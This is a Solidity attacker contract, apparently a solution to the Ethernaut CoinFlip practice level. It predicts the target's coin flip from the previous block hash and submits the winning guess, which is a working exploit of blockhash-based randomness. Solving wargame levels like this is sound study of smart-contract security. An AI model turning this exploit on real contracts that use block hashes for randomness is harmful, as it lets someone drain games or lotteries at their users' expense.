// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);

    function consecutiveWins() external view returns (uint256);
}

contract Ethernaut {
    address private _owner;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public target;

    modifier onlyOwner() {
        require(msg.sender == _owner, "unauthorized");
        _;
    }

    constructor(address target_) {
        _owner = msg.sender;
        target = ICoinFlip(target_);
        // target = ICoinFlip(0x10E19c47bAf81ad1095aeE7486E75626d56624D5);
    }

    function attack() external onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool answer = (blockValue / FACTOR) == 1 ? true : false;
        require(target.flip(answer), "wrong");
    }
}
